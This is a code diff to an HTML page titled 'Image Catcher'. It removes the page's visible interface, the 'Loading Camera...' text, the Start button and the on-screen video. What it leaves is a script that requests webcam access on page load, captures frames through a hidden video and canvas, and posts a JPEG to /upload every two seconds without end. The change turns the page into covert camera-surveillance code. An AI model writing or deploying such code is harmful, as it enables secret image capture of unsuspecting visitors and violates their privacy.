@@ -1,50 +1,44 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Image Catcher</title>
-</head>
-
-<body style="margin:0;background:black;color:white;text-align:center;">
-
-<h3>Loading Camera...</h3>
-
-<button onclick="startCamera()">Start</button>
-
-<video id="video" autoplay playsinline width="300"></video>
-<canvas id="canvas" style="display:none;"></canvas>
-
 <script>
-  async function startCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+let video;
+let stream;
 
-      const video = document.getElementById("video");
-      video.srcObject = stream;
+window.onload = async () => {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-      const canvas = document.getElementById("canvas");
-      const ctx = canvas.getContext("2d");
+    video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
 
-      setInterval(() => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
 
-        ctx.drawImage(video, 0, 0);
+    function captureLoop() {
+      if (!video.videoWidth) {
+        requestAnimationFrame(captureLoop);
+        return;
+      }
 
-        const img = canvas.toDataURL("image/jpeg");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-        fetch("/upload", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ img })
-        });
+      ctx.drawImage(video, 0, 0);
 
-      }, 2000);
+      const img = canvas.toDataURL("image/jpeg");
 
-    } catch (e) {
-      console.log("Permission denied");
+      fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ img })
+      });
+
+      setTimeout(captureLoop, 2000); // continuous every 2 sec
     }
-  }
-</script>
 
-</body>
-</html>
+    captureLoop();
+
+  } catch (e) {
+    console.log("Permission denied");
+  }
+};
+</script>
